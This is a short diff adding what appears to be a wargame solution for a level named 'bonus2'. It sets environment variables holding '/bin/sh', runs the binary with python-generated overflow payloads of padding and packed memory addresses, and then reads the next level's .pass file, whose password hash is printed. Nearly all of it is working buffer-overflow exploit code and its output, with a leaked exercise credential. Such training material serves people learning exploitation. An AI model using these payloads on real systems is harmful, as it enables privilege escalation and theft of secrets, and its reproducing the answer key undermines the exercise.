@@ -1,0 +1,5 @@
+export LANG=fi
+export STR=/bin/sh
+./bonus2 $(python -c "print'1234\x8e\xfe\xff\xbf'+'A'*42") $(python -c "print 'A'*6+'\x60\xb0\xe6\xb7'*4")
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
